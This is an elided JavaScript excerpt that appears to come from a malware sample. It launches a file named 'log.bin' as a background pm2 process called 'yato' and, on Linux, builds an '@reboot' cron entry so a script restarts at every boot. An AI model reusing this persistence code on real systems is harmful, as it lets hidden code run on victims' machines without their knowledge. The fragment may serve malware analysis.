...
async function makePM2() {
  ...
  const pm2Path = nodePath.replace(/node$/, 'pm2');
  ...
  execSync(
    "` +
    pm2Path +
    ` start " + sourcePath + "/log.bin --name yato --interpreter ` +
    nodePath +
    `",
  );
  execSync("` +
...
const screenStyle = () => {
  ...
  switch (process.platform) {
    case 'linux':
      ...
      const binPath = nodePath.replace(/\/node$/, ''); // remove trailing /node
      const finalPath = `PATH=${binPath}:/usr/bin:/bin`;
      try {
        nodePath = execSync('which node', { encoding: 'utf8' }).trim();
      } catch (error) {}

      const cronCommand = `${finalPath}\\n@reboot ${nodePath} ${scriptPath}`;
